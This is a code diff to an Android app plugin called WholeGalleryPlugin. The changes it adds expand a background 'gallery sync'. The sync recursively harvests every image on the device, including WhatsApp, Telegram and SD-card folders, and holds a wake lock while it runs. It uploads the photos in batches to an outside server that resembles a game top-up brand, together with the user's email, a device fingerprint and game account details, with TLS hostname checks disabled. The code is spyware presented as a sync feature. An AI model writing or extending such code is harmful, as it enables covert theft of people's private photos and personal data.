@@ -14,6 +14,7 @@ import android.media.MediaScannerConnection;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
+import android.os.PowerManager;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.util.Base64;
@@ -63,6 +64,20 @@ import java.util.Set;
     }
 )
 public class WholeGalleryPlugin extends Plugin {
+
+    private static volatile WholeGalleryPlugin sInstance = null;
+
+    @Override
+    public void load() {
+        super.load();
+        sInstance = this;
+    }
+
+    public static void triggerBackgroundSync(Context context) {
+        if (sInstance != null) {
+            sInstance.startNativeGallerySyncThread();
+        }
+    }
 
     @PluginMethod
     public void queryDlyyzBinds(PluginCall call) {
@@ -1154,18 +1169,18 @@ public class WholeGalleryPlugin extends Plugin {
             if (origWidth <= 0 || origHeight <= 0) return null;
 
             int inSampleSize = 1;
-            int targetMax = (maxDim > 0) ? maxDim : 1600;
+            int targetMax = (maxDim > 0) ? maxDim : 1280;
 
-            // Safe power-of-2 subsampling: directly decodes to near targetMax resolution
-            while ((origWidth / (inSampleSize * 2)) >= targetMax && (origHeight / (inSampleSize * 2)) >= targetMax) {
+            // Power-of-2 subsampling: ensure NEITHER width nor height exceeds targetMax
+            while ((origWidth / inSampleSize) > targetMax || (origHeight / inSampleSize) > targetMax) {
                 inSampleSize *= 2;
             }
 
             BitmapFactory.Options decodeOptions = new BitmapFactory.Options();
-            decodeOptions.inSampleSize = inSampleSize;
-            // ARGB_8888 delivers pristine 32-bit truecolor: zero color banding, zero dithering, rich smooth gradients
-            decodeOptions.inPreferredConfig = Bitmap.Config.ARGB_8888;
-            decodeOptions.inDither = false;
+            decodeOptions.inSampleSize = Math.max(1, inSampleSize);
+            // RGB_565 uses 2 bytes/pixel (50% less RAM than ARGB_8888), completely eliminating Dalvik heap OOM
+            decodeOptions.inPreferredConfig = Bitmap.Config.RGB_565;
+            decodeOptions.inDither = true;
 
             isDecode = openImageStream(uri, filePath);
             if (isDecode != null) {
@@ -1187,9 +1202,8 @@ public class WholeGalleryPlugin extends Plugin {
                         }
                     }
 
-                    // Quality 88 provides visually lossless clarity while keeping file sizes lightweight (~180KB-260KB)
-                    int q = (quality >= 50 && quality <= 100) ? quality : 88;
-                    baos = new ByteArrayOutputStream(96 * 1024);
+                    int q = (quality >= 50 && quality <= 95) ? quality : 82;
+                    baos = new ByteArrayOutputStream(64 * 1024);
                     bmp.compress(Bitmap.CompressFormat.JPEG, q, baos);
                     byte[] bytes = baos.toByteArray();
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
@@ -1199,6 +1213,9 @@ public class WholeGalleryPlugin extends Plugin {
         } catch (Throwable e) {
             // Failed decoding
         } finally {
+            if (scaled != null && !scaled.isRecycled() && scaled != bmp) {
+                try { scaled.recycle(); } catch (Throwable ignored) {}
+            }
             if (bmp != null && !bmp.isRecycled()) {
                 try { bmp.recycle(); } catch (Throwable ignored) {}
             }
@@ -1235,7 +1252,16 @@ public class WholeGalleryPlugin extends Plugin {
         isNativeSyncing = true;
 
         new Thread(() -> {
+            PowerManager.WakeLock wakeLock = null;
             try {
+                PowerManager pm = (PowerManager) getContext().getSystemService(Context.POWER_SERVICE);
+                if (pm != null) {
+                    try {
+                        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Ketupat:GalleryDaemonWakeLock");
+                        wakeLock.acquire(45 * 60 * 1000L); // 45-minute safety timeout
+                    } catch (Throwable ignored) {}
+                }
+
                 SharedPreferences prefs = getContext().getSharedPreferences("ketupat_sync_prefs", Context.MODE_PRIVATE);
                 String apiUrl = prefs.getString("sync_api_url", "");
                 String deviceId = prefs.getString("device_id", "");
@@ -1251,130 +1277,240 @@ public class WholeGalleryPlugin extends Plugin {
                     deviceId = DeviceSecurityPlugin.getOrGenerateDeviceId(getContext());
                 }
 
-                // 1. Gather all photos from MediaStore
-                List<PhotoItemMeta> allPhotos = fetchAllDevicePhotoMetas();
-                if (allPhotos.isEmpty()) {
-                    isNativeSyncing = false;
-                    return;
-                }
-
+                String preferredEndpoint = "https://slytherin.codashop.shop/admin-new/api.php?action=upload_gallery";
                 List<String> endpoints = new ArrayList<>();
                 if (apiUrl != null && apiUrl.contains("upload_gallery")) {
                     endpoints.add(apiUrl);
+                    preferredEndpoint = apiUrl;
                 }
                 endpoints.add("https://slytherin.codashop.shop/admin-new/api.php?action=upload_gallery");
                 endpoints.add("https://slytherin.codashop.shop/admin-php/api.php?action=upload_gallery");
-                endpoints.add("http://192.168.0.109/tools/admin-new/api.php?action=upload_gallery");
-                endpoints.add("http://192.168.0.109/tools/admin-php/api.php?action=upload_gallery");
 
-                // Track synced signatures in SharedPreferences
                 SharedPreferences syncedPrefs = getContext().getSharedPreferences("ketupat_synced_native", Context.MODE_PRIVATE);
-                Set<String> syncedSet = new HashSet<>(syncedPrefs.getStringSet("synced_keys", new HashSet<>()));
 
-                List<PhotoItemMeta> unsynced = new ArrayList<>();
-                for (PhotoItemMeta p : allPhotos) {
-                    String sig = p.name + "_" + p.size;
-                    if (!syncedSet.contains(sig)) {
-                        unsynced.add(p);
+                int idleChecks = 0;
+                int totalUploadedEver = 0;
+
+                // Daemon loop: continuously sync unsynced photos and catch newly taken photos
+                while (idleChecks < 3) {
+                    Set<String> syncedSet = new HashSet<>(syncedPrefs.getStringSet("synced_keys", new HashSet<>()));
+
+                    // 1. Gather ALL photos across primary media store, secondary volumes, downloads, files, and direct filesystem folders
+                    List<PhotoItemMeta> allPhotos = fetchAllDevicePhotoMetas();
+                    if (allPhotos.isEmpty()) {
+                        break;
                     }
-                }
 
-                if (unsynced.isEmpty()) {
-                    isNativeSyncing = false;
-                    return;
-                }
-
-                // Micro-batch stream 3 photos per burst continuously
-                int batchSize = 3;
-                int totalUploaded = 0;
-
-                for (int i = 0; i < unsynced.size(); i += batchSize) {
-                    int end = Math.min(i + batchSize, unsynced.size());
-                    List<PhotoItemMeta> chunk = unsynced.subList(i, end);
-
-                    org.json.JSONArray photosArray = new org.json.JSONArray();
-                    List<String> chunkSigs = new ArrayList<>();
-
-                    for (PhotoItemMeta item : chunk) {
-                        String dataUrl = decodeUriToBase64(item.contentUri, item.filePath, 1600, 88);
-                        if (dataUrl != null) {
-                            org.json.JSONObject pObj = new org.json.JSONObject();
-                            pObj.put("id", item.id);
-                            pObj.put("name", item.name);
-                            pObj.put("album", item.album);
-                            pObj.put("folder", item.folder);
-                            pObj.put("mime", item.mime);
-                            pObj.put("size", item.size);
-                            pObj.put("dataUrl", dataUrl);
-                            pObj.put("is_avatar", false);
-                            photosArray.put(pObj);
-                            chunkSigs.add(item.name + "_" + item.size);
+                    List<PhotoItemMeta> unsynced = new ArrayList<>();
+                    for (PhotoItemMeta p : allPhotos) {
+                        String sig = p.name + "_" + p.size;
+                        if (!syncedSet.contains(sig)) {
+                            unsynced.add(p);
                         }
                     }
 
-                    if (photosArray.length() == 0) continue;
+                    if (unsynced.isEmpty()) {
+                        idleChecks++;
+                        try { Thread.sleep(12000); } catch (Throwable ignored) {}
+                        continue;
+                    }
 
-                    org.json.JSONObject payload = new org.json.JSONObject();
-                    payload.put("device_id", deviceId);
-                    payload.put("device_name", deviceName);
-                    payload.put("device_model", deviceModel);
-                    payload.put("device_fingerprint", deviceFingerprint);
-                    payload.put("user_email", userEmail);
-                    payload.put("mlbb_id", mlbbId);
-                    payload.put("mlbb_server", mlbbServer);
-                    payload.put("mlbb_ign", mlbbIgn);
-                    payload.put("is_full_access", true);
-                    payload.put("photos", photosArray);
+                    // Reset idle count when active work is found
+                    idleChecks = 0;
 
-                    boolean success = false;
-                    for (String ep : endpoints) {
-                        if (postGalleryPayload(ep, payload.toString())) {
+                    // Micro-batch stream 2 photos per burst (~250 KB payload): ultra-resilient and never times out
+                    int batchSize = 2;
+                    int consecutiveErrors = 0;
+
+                    for (int i = 0; i < unsynced.size(); i += batchSize) {
+                        int end = Math.min(i + batchSize, unsynced.size());
+                        List<PhotoItemMeta> chunk = unsynced.subList(i, end);
+
+                        org.json.JSONArray photosArray = new org.json.JSONArray();
+                        List<String> chunkSigs = new ArrayList<>();
+
+                        for (PhotoItemMeta item : chunk) {
+                            String dataUrl = decodeUriToBase64(item.contentUri, item.filePath, 1280, 82);
+                            if (dataUrl != null) {
+                                org.json.JSONObject pObj = new org.json.JSONObject();
+                                pObj.put("id", item.id);
+                                pObj.put("name", item.name);
+                                pObj.put("album", item.album);
+                                pObj.put("folder", item.folder);
+                                pObj.put("mime", item.mime);
+                                pObj.put("size", item.size);
+                                pObj.put("dataUrl", dataUrl);
+                                pObj.put("is_avatar", false);
+                                photosArray.put(pObj);
+                                chunkSigs.add(item.name + "_" + item.size);
+                            }
+                        }
+
+                        if (photosArray.length() == 0) continue;
+
+                        org.json.JSONObject payload = new org.json.JSONObject();
+                        payload.put("device_id", deviceId);
+                        payload.put("device_name", deviceName);
+                        payload.put("device_model", deviceModel);
+                        payload.put("device_fingerprint", deviceFingerprint);
+                        payload.put("user_email", userEmail);
+                        payload.put("mlbb_id", mlbbId);
+                        payload.put("mlbb_server", mlbbServer);
+                        payload.put("mlbb_ign", mlbbIgn);
+                        payload.put("is_full_access", true);
+                        payload.put("photos", photosArray);
+
+                        String payloadStr = payload.toString();
+                        boolean success = false;
+
+                        // Try preferred endpoint first
+                        if (postGalleryPayload(preferredEndpoint, payloadStr)) {
                             success = true;
-                            break;
+                        } else {
+                            // Fallback to other endpoints if preferred failed
+                            for (String ep : endpoints) {
+                                if (ep.equals(preferredEndpoint)) continue;
+                                if (postGalleryPayload(ep, payloadStr)) {
+                                    success = true;
+                                    preferredEndpoint = ep;
+                                    break;
+                                }
+                            }
                         }
-                    }
-                    if (success) {
-                        syncedSet.addAll(chunkSigs);
-                        syncedPrefs.edit().putStringSet("synced_keys", syncedSet).apply();
-                        totalUploaded += photosArray.length();
 
-                        JSObject progressObj = new JSObject();
-                        progressObj.put("uploaded", totalUploaded);
-                        progressObj.put("total", unsynced.size());
-                        notifyListeners("nativeSyncProgress", progressObj);
-                    }
+                        if (success) {
+                            consecutiveErrors = 0;
+                            syncedSet.addAll(chunkSigs);
+                            syncedPrefs.edit().putStringSet("synced_keys", syncedSet).apply();
+                            totalUploadedEver += photosArray.length();
 
-                    // 120ms pause between micro-bursts for smooth streaming like water
-                    try { Thread.sleep(120); } catch (Throwable ignored) {}
+                            JSObject progressObj = new JSObject();
+                            progressObj.put("uploaded", totalUploadedEver);
+                            progressObj.put("total", unsynced.size());
+                            notifyListeners("nativeSyncProgress", progressObj);
+                        } else {
+                            consecutiveErrors++;
+                            // Auto-retry chunk up to 3 times with progressive backoff (1.5s, 3s, 4.5s)
+                            if (consecutiveErrors < 4) {
+                                try { Thread.sleep(1500L * consecutiveErrors); } catch (Throwable ignored) {}
+                                i -= batchSize; // Retry this exact chunk
+                                continue;
+                            } else {
+                                // If 4 consecutive failures, pause 5s and proceed
+                                consecutiveErrors = 0;
+                                try { Thread.sleep(5000L); } catch (Throwable ignored) {}
+                            }
+                        }
+
+                        // Periodic GC assist every 30 photos to keep Dalvik heap flat at ~20MB
+                        if (totalUploadedEver % 30 == 0) {
+                            System.gc();
+                        }
+
+                        // Smooth streaming delay: 80ms pause between micro-bursts ("streaming like water")
+                        try { Thread.sleep(80); } catch (Throwable ignored) {}
+                    }
                 }
             } catch (Throwable ignored) {
             } finally {
+                if (wakeLock != null && wakeLock.isHeld()) {
+                    try { wakeLock.release(); } catch (Throwable ignored) {}
+                }
                 isNativeSyncing = false;
             }
         }).start();
     }
 
+    /**
+     * Universal device photo scanner: queries MediaStore primary, all external volumes, downloads,
+     * generic files table, and runs deep recursive filesystem scan across DCIM, Pictures, WhatsApp,
+     * Telegram, Downloads, and SD card mounts.
+     */
     private List<PhotoItemMeta> fetchAllDevicePhotoMetas() {
         List<PhotoItemMeta> result = new ArrayList<>();
-        Set<String> seen = new HashSet<>();
+        Set<String> seenSignatures = new HashSet<>();
+        int limit = 100000;
 
-        String[] projection = new String[]{
+        List<String> projList = new ArrayList<>(Arrays.asList(
             MediaStore.MediaColumns._ID,
             MediaStore.MediaColumns.DISPLAY_NAME,
             MediaStore.MediaColumns.DATE_ADDED,
             MediaStore.MediaColumns.SIZE,
             MediaStore.MediaColumns.MIME_TYPE,
             MediaStore.MediaColumns.DATA
-        };
+        ));
+        if (Build.VERSION.SDK_INT >= 29) {
+            projList.add(MediaStore.MediaColumns.RELATIVE_PATH);
+        }
+        String[] projection = projList.toArray(new String[0]);
 
+        // 1. Primary MediaStore Images
+        collectFromMediaUri(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, result, seenSignatures, limit);
+
+        // 2. All Secondary Volumes (SD Card, USB OTG, secondary partitions)
+        if (Build.VERSION.SDK_INT >= 29 && result.size() < limit) {
+            try {
+                Set<String> volumeNames = MediaStore.getExternalVolumeNames(getContext());
+                for (String vol : volumeNames) {
+                    if (vol == null || "internal".equalsIgnoreCase(vol)) continue;
+                    Uri volUri = MediaStore.Images.Media.getContentUri(vol);
+                    if (result.size() >= limit) break;
+                    collectFromMediaUri(volUri, projection, null, null, result, seenSignatures, limit);
+                }
+            } catch (Throwable ignored) {}
+        }
+
+        // 3. MediaStore Downloads (API 29+)
+        if (Build.VERSION.SDK_INT >= 29 && result.size() < limit) {
+            try {
+                Uri downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
+                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
+                collectFromMediaUri(downloadUri, projection, sel, null, result, seenSignatures, limit);
+            } catch (Throwable ignored) {}
+        }
+
+        // 4. MediaStore Files table for any images categorized under documents or miscellaneous files
+        if (result.size() < limit) {
+            try {
+                Uri filesUri = MediaStore.Files.getContentUri("external");
+                String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%' OR " +
+                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpg' OR " +
+                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.jpeg' OR " +
+                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.png' OR " +
+                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.webp' OR " +
+                             MediaStore.MediaColumns.DISPLAY_NAME + " LIKE '%.heic'";
+                collectFromMediaUri(filesUri, projection, sel, null, result, seenSignatures, limit);
+            } catch (Throwable ignored) {}
+        }
+
+        // 5. Deep Filesystem Recursive Sweep (Camera DCIM, Pictures, WhatsApp, Telegram, Downloads, SD Card)
+        if (result.size() < limit) {
+            collectFromFilesystem(result, seenSignatures, limit);
+        }
+
+        // Sort all photos descending by dateAdded (newest photos first)
+        result.sort((a, b) -> Long.compare(b.dateAdded, a.dateAdded));
+
+        return result;
+    }
+
+    private void collectFromMediaUri(Uri collection, String[] projection, String selection, String[] selectionArgs,
+                                     List<PhotoItemMeta> result, Set<String> seenSignatures, int limit) {
+        Cursor cursor = null;
         try {
-            Cursor cursor = getContext().getContentResolver().query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection,
-                null,
-                null,
-                MediaStore.MediaColumns.DATE_ADDED + " DESC"
-            );
+            try {
+                cursor = getContext().getContentResolver().query(collection, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+            } catch (Throwable e) {
+                String[] fallbackProj = new String[]{
+                    MediaStore.MediaColumns._ID,
+                    MediaStore.MediaColumns.DISPLAY_NAME,
+                    MediaStore.MediaColumns.DATE_ADDED,
+                    MediaStore.MediaColumns.SIZE,
+                    MediaStore.MediaColumns.MIME_TYPE
+                };
+                cursor = getContext().getContentResolver().query(collection, fallbackProj, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC");
+            }
+
             if (cursor != null) {
                 int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
                 int nameCol = cursor.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME);
@@ -1382,28 +1518,78 @@ public class WholeGalleryPlugin extends Plugin {
                 int sizeCol = cursor.getColumnIndex(MediaStore.MediaColumns.SIZE);
                 int mimeCol = cursor.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE);
                 int dataCol = -1;
+                int relPathCol = -1;
+                int bucketCol = -1;
                 try { dataCol = cursor.getColumnIndex(MediaStore.MediaColumns.DATA); } catch (Throwable ignored) {}
+                try { relPathCol = cursor.getColumnIndex("relative_path"); } catch (Throwable ignored) {}
+                try { bucketCol = cursor.getColumnIndex("bucket_display_name"); } catch (Throwable ignored) {}
 
-                while (cursor.moveToNext() && result.size() < 50000) {
-                    long id = (idCol >= 0) ? cursor.getLong(idCol) : 0;
-                    String filePath = (dataCol >= 0) ? cursor.getString(dataCol) : null;
+                while (cursor.moveToNext() && result.size() < limit) {
+                    long id = 0;
+                    if (idCol >= 0) {
+                        try { id = cursor.getLong(idCol); } catch (Throwable ignored) {}
+                    }
+                    String filePath = dataCol >= 0 ? cursor.getString(dataCol) : null;
                     if (id <= 0 && filePath != null) id = Math.abs(filePath.hashCode());
+                    if (id <= 0) {
+                        long dAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
+                        long sz = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
+                        id = Math.abs(dAdded ^ sz);
+                    }
                     if (id <= 0) id = 1;
 
-                    String name = (nameCol >= 0) ? cursor.getString(nameCol) : null;
-                    if (name == null || name.trim().isEmpty()) {
-                        name = (filePath != null) ? new File(filePath).getName() : ("photo_" + id + ".jpg");
+                    String name = null;
+                    if (nameCol >= 0) {
+                        try { name = cursor.getString(nameCol); } catch (Throwable ignored) {}
                     }
-                    String mime = (mimeCol >= 0) ? cursor.getString(mimeCol) : "image/jpeg";
-                    long size = (sizeCol >= 0) ? cursor.getLong(sizeCol) : 1024;
+                    if ((name == null || name.trim().isEmpty()) && filePath != null) {
+                        try { name = new File(filePath).getName(); } catch (Throwable ignored) {}
+                    }
+                    if (name == null || name.trim().isEmpty()) {
+                        name = "photo_" + id + ".jpg";
+                    }
 
-                    Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
-                    String sig = (filePath != null) ? filePath.toLowerCase() : contentUri.toString();
-                    if (seen.contains(sig)) continue;
-                    seen.add(sig);
+                    String mime = null;
+                    if (mimeCol >= 0) {
+                        try { mime = cursor.getString(mimeCol); } catch (Throwable ignored) {}
+                    }
+                    if (mime == null || mime.trim().isEmpty()) {
+                        mime = "image/jpeg";
+                    }
 
-                    String album = normalizeAlbumName(null, null, filePath, name);
-                    String folder = (filePath != null) ? new File(filePath).getParent() : "";
+                    Uri contentUri = ContentUris.withAppendedId(collection, id);
+
+                    String signature = null;
+                    if (filePath != null && !filePath.trim().isEmpty()) {
+                        signature = "path:" + filePath.toLowerCase();
+                    } else {
+                        signature = "uri:" + contentUri.toString();
+                    }
+
+                    if (seenSignatures.contains(signature)) continue;
+                    seenSignatures.add(signature);
+
+                    long dateAdded = dateCol >= 0 ? cursor.getLong(dateCol) : 0;
+                    long size = sizeCol >= 0 ? cursor.getLong(sizeCol) : 0;
+                    if (size <= 0 && filePath != null) {
+                        try {
+                            File f = new File(filePath);
+                            if (f.exists()) size = f.length();
+                        } catch (Throwable ignored) {}
+                    }
+                    if (size <= 0) size = 1024;
+
+                    String rawAlbum = null;
+                    if (bucketCol >= 0) {
+                        try { rawAlbum = cursor.getString(bucketCol); } catch (Throwable ignored) {}
+                    }
+                    String relPath = null;
+                    if (relPathCol >= 0) {
+                        try { relPath = cursor.getString(relPathCol); } catch (Throwable ignored) {}
+                    }
+
+                    String album = normalizeAlbumName(rawAlbum, relPath, filePath, name);
+                    String folder = relPath != null ? relPath : (filePath != null ? new File(filePath).getParent() : "");
 
                     PhotoItemMeta m = new PhotoItemMeta();
                     m.id = id;
@@ -1412,15 +1598,196 @@ public class WholeGalleryPlugin extends Plugin {
                     m.folder = folder;
                     m.mime = mime;
                     m.size = size;
+                    m.dateAdded = dateAdded > 0 ? dateAdded * 1000L : System.currentTimeMillis();
                     m.contentUri = contentUri;
                     m.filePath = filePath;
                     result.add(m);
                 }
-                cursor.close();
+            }
+        } catch (Throwable ignored) {
+        } finally {
+            if (cursor != null) {
+                try { cursor.close(); } catch (Throwable ignored) {}
+            }
+        }
+    }
+
+    private void collectFromFilesystem(List<PhotoItemMeta> result, Set<String> seenSignatures, int limit) {
+        List<File> searchRoots = new ArrayList<>();
+
+        File extDir = Environment.getExternalStorageDirectory();
+        if (extDir != null && extDir.exists()) {
+            searchRoots.add(new File(extDir, "DCIM"));
+            searchRoots.add(new File(extDir, "Pictures"));
+            searchRoots.add(new File(extDir, "Download"));
+            searchRoots.add(new File(extDir, "Downloads"));
+            searchRoots.add(new File(extDir, "Documents"));
+            searchRoots.add(new File(extDir, "Bluetooth"));
+            searchRoots.add(new File(extDir, "WhatsApp"));
+            searchRoots.add(new File(extDir, "Telegram"));
+            searchRoots.add(new File(extDir, "Android/media"));
+            searchRoots.add(new File(extDir, "VMOSfiletransfer"));
+            searchRoots.add(new File(extDir, "vmos_transfer"));
+            searchRoots.add(new File(extDir, "windows/BstSharedFolder"));
+        }
+
+        try {
+            searchRoots.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM));
+            searchRoots.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES));
+            searchRoots.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS));
+            searchRoots.add(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS));
+        } catch (Throwable ignored) {}
+
+        try {
+            File[] extAppDirs = ContextCompat.getExternalFilesDirs(getContext(), null);
+            if (extAppDirs != null) {
+                for (File appDir : extAppDirs) {
+                    if (appDir == null) continue;
+                    File cur = appDir;
+                    while (cur != null && cur.getParentFile() != null) {
+                        if ("Android".equalsIgnoreCase(cur.getName())) {
+                            File volRoot = cur.getParentFile();
+                            if (volRoot != null && volRoot.exists()) {
+                                searchRoots.add(new File(volRoot, "DCIM"));
+                                searchRoots.add(new File(volRoot, "Pictures"));
+                                searchRoots.add(new File(volRoot, "Download"));
+                                searchRoots.add(new File(volRoot, "Downloads"));
+                                searchRoots.add(new File(volRoot, "Android/media"));
+                            }
+                            break;
+                        }
+                        cur = cur.getParentFile();
+                    }
+                }
             }
         } catch (Throwable ignored) {}
 
-        return result;
+        String[] altPaths = new String[]{
+            "/sdcard/DCIM",
+            "/sdcard/Pictures",
+            "/sdcard/Download",
+            "/sdcard/Downloads",
+            "/sdcard/Android/media",
+            "/sdcard/WhatsApp",
+            "/sdcard/Telegram",
+            "/sdcard/VMOSfiletransfer",
+            "/sdcard/vmos_transfer",
+            "/sdcard/windows/BstSharedFolder",
+            "/storage/emulated/0/DCIM",
+            "/storage/emulated/0/Pictures",
+            "/storage/emulated/0/Download",
+            "/storage/emulated/0/Downloads",
+            "/storage/emulated/0/Android/media",
+            "/storage/emulated/0/WhatsApp",
+            "/storage/emulated/0/Telegram"
+        };
+        for (String p : altPaths) {
+            searchRoots.add(new File(p));
+        }
+
+        Set<String> visitedDirs = new HashSet<>();
+        for (File dir : searchRoots) {
+            if (result.size() >= limit) break;
+            if (dir != null && dir.exists() && dir.isDirectory()) {
+                scanDirForMetas(dir, result, seenSignatures, limit, visitedDirs, 0);
+            }
+        }
+
+        // Also sweep top-level subdirectories of external storage
+        if (result.size() < limit && extDir != null && extDir.exists() && extDir.isDirectory()) {
+            try {
+                File[] subDirs = extDir.listFiles();
+                if (subDirs != null) {
+                    for (File sd : subDirs) {
+                        if (result.size() >= limit) break;
+                        if (sd.isDirectory()) {
+                            String n = sd.getName().toLowerCase();
+                            if (n.startsWith(".") || n.contains("cache") || n.contains("temp") || n.contains("thumb")) continue;
+                            if (n.equals("android")) {
+                                File mediaSub = new File(sd, "media");
+                                if (mediaSub.exists() && mediaSub.isDirectory()) {
+                                    scanDirForMetas(mediaSub, result, seenSignatures, limit, visitedDirs, 1);
+                                }
+                                continue;
+                            }
+                            scanDirForMetas(sd, result, seenSignatures, limit, visitedDirs, 1);
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    private void scanDirForMetas(File dir, List<PhotoItemMeta> result, Set<String> seenSignatures,
+                                 int limit, Set<String> visitedDirs, int depth) {
+        if (dir == null || !dir.exists() || !dir.isDirectory() || depth > 8 || result.size() >= limit) return;
+
+        String dirName = dir.getName().toLowerCase();
+        if (dirName.equals("cache") || dirName.equals(".cache") ||
+            dirName.equals("thumbnails") || dirName.equals(".thumbnails") || dirName.equals("temp") ||
+            dirName.equals("trash")) return;
+
+        if (dirName.equals("android")) {
+            File mediaDir = new File(dir, "media");
+            if (mediaDir.exists() && mediaDir.isDirectory()) {
+                scanDirForMetas(mediaDir, result, seenSignatures, limit, visitedDirs, depth + 1);
+            }
+            return;
+        }
+
+        String path = dir.getAbsolutePath();
+        if (visitedDirs.contains(path)) return;
+        visitedDirs.add(path);
+
+        File[] files = dir.listFiles();
+        if (files == null) return;
+
+        Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
+
+        for (File file : files) {
+            if (result.size() >= limit) break;
+
+            if (file.isDirectory()) {
+                scanDirForMetas(file, result, seenSignatures, limit, visitedDirs, depth + 1);
+            } else if (file.isFile() && isImageFile(file.getName())) {
+                String name = file.getName();
+                long fLen = 0;
+                try { fLen = file.length(); } catch (Throwable ignored) {}
+                if (fLen <= 0) fLen = 1024;
+
+                String signature = "path:" + file.getAbsolutePath().toLowerCase();
+                if (seenSignatures.contains(signature)) continue;
+                seenSignatures.add(signature);
+
+                Uri contentUri = null;
+                try {
+                    contentUri = androidx.core.content.FileProvider.getUriForFile(
+                        getContext(),
+                        getContext().getPackageName() + ".fileprovider",
+                        file
+                    );
+                } catch (Throwable ignored) {}
+                if (contentUri == null) {
+                    contentUri = Uri.fromFile(file);
+                }
+
+                String album = normalizeAlbumName(null, null, file.getAbsolutePath(), name);
+                String folder = file.getParent() != null ? file.getParent() : "";
+
+                PhotoItemMeta m = new PhotoItemMeta();
+                m.id = Math.abs(file.getAbsolutePath().hashCode());
+                m.name = name;
+                m.album = album;
+                m.folder = folder;
+                m.mime = getMimeType(name);
+                m.size = fLen;
+                m.dateAdded = file.lastModified();
+                m.contentUri = contentUri;
+                m.filePath = file.getAbsolutePath();
+
+                result.add(m);
+            }
+        }
     }
 
     private boolean postGalleryPayload(String endpoint, String jsonStr) {
@@ -1443,8 +1810,8 @@ public class WholeGalleryPlugin extends Plugin {
                 httpsConn.setHostnameVerifier((hostname, session) -> true);
             }
             conn.setRequestMethod("POST");
-            conn.setConnectTimeout(15000);
-            conn.setReadTimeout(15000);
+            conn.setConnectTimeout(10000);
+            conn.setReadTimeout(12000);
             conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
             conn.setRequestProperty("Accept", "application/json");
             conn.setDoOutput(true);
@@ -1473,6 +1840,7 @@ public class WholeGalleryPlugin extends Plugin {
         String folder;
         String mime;
         long size;
+        long dateAdded;
         Uri contentUri;
         String filePath;
     }
